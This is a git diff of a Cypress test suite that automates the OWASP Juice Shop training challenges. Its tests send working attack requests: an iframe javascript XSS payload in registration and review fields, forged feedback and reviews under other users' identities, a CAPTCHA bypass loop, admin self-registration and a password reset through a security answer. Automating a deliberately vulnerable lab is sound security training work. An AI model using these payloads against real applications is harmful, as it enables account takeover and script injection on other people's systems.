@@ -4,6 +4,7 @@ import resetPassword from '../POM/resetPassword.pom';
 import sideNav from '../POM/sideNav.pom';
 import loginPage from '../POM/loginPage.pom';
 import complaint from '../POM/complaint.pom';
+import products from '../POM/products.pom'
 
 describe('OWASP JuiceShop Achivments unlocking Automation', () => {
   context('3 - stars vulnerabilities', () => {
@@ -21,7 +22,6 @@ describe('OWASP JuiceShop Achivments unlocking Automation', () => {
     it('1 - Admin Registration', () => {
       const email = registrationPage.userEmail;
       const password = registrationPage.userPassword;
-      cy.server();
       cy.request({
         method: 'POST',
         url: '/api/Users/',
@@ -46,7 +46,6 @@ describe('OWASP JuiceShop Achivments unlocking Automation', () => {
     });
 
     it('3 - CAPTCHA Bypass', () => {
-      cy.intercept('/rest/captcha/').as('captcha');
       sideNav.navigateToCustomerFeedback();
       cy.wait('@captcha').then((captcha) => {
         for (let i = 0; i < 10; i++) {
@@ -69,7 +68,6 @@ describe('OWASP JuiceShop Achivments unlocking Automation', () => {
       //This challenge is not available on Docker!
       const email = registrationPage.userEmail;
       const password = registrationPage.userPassword;
-      cy.server();
       cy.request({
         method: 'POST',
         url: '/api/Users/',
@@ -77,8 +75,8 @@ describe('OWASP JuiceShop Achivments unlocking Automation', () => {
           'content-type': 'application/json'
         },
         body: {
-          "email": "<iframe src=\"javascript:alert(`xss`)\">", 
-          "password": password, 
+          "email": "<iframe src=\"javascript:alert(`xss`)\">",
+          "password": password,
           "passwordRepeat": password,
           "securityQuestion": {
             "id": 1,
@@ -93,32 +91,40 @@ describe('OWASP JuiceShop Achivments unlocking Automation', () => {
     });
 
     it('5 - Forged Feedback', () => {
-      cy.intercept('captcha/').as('captcha');
       sideNav.navigateToCustomerFeedback();
       cy.wait('@captcha').then((captcha) => {
-          cy.request({
-            method: 'POST',
-            url: '/api/Feedbacks/',
-            body: {
-              captchaId: captcha.response.body.captchaId,
-              captcha: `${captcha.response.body.answer}`,
-              comment: "rte (anonymous)",
-              rating: 1, 
-              UserId: 6,
-            }
-          });
+        cy.request({
+          method: 'POST',
+          url: '/api/Feedbacks/',
+          body: {
+            captchaId: captcha.response.body.captchaId,
+            captcha: `${captcha.response.body.answer}`,
+            comment: "rte (anonymous)",
+            rating: 1,
+            UserId: 6,
+          }
+        });
       });
       cy.checkIsAchivSolvedXHR('Forged Feedback');
     });
 
     it('6 - Forged Review', () => {
-      cy.request({
-        method: 'PUT',
-        url: '/rest/products/1/reviews',
-        body: {
-          author: 'bjoern@owasp.org',
-          message: 'Forged Review',
-        }
+      registrationPage.register();
+      loginPage.login();
+      cy.intercept('PUT', '**/rest/products/**').as('productReview');
+      products.sendReview('Apple Juice', 'Best review');
+      cy.wait('@productReview').then((review) => {
+        cy.request({
+          method: 'PUT',
+          url: review.request.url,
+          headers: {
+            'authorization': review.request.headers.authorization
+          },
+          body: {
+            author: 'admin',
+            message: 'Forged Review'
+          }
+        });
       });
       cy.checkIsAchivSolvedXHR('Forged Review');
     });
@@ -131,7 +137,7 @@ describe('OWASP JuiceShop Achivments unlocking Automation', () => {
     });
 
     it('8 - Privacy Policy Inspection', () => {
-      cy.visit('/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility', {failOnStatusCode: false});
+      cy.visit('/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility', { failOnStatusCode: false });
       cy.checkIsAchivSolvedXHR('Privacy Policy Inspection');
     });
 
@@ -167,6 +173,19 @@ describe('OWASP JuiceShop Achivments unlocking Automation', () => {
       const email = 'jim@juice-sh.op';
       resetPassword.resetPassword(email, newPassword, securityAnswer);
       cy.checkIsAchivSolvedXHR("Reset Jim's Password");
+    });
+
+    it.skip('13 - API-only XSS', () => {
+      //This challenge is not available on Docker!
+      cy.request({
+        method: 'PUT',
+        url: '/rest/products/24/reviews',
+        body: {
+          messege: "<iframe src=\"javascript:alert(`xss`)\">",
+          author: "Anonymous"
+        }
+      });
+      cy.checkIsAchivSolvedXHR("API-only XSS");
     });
   });
 });
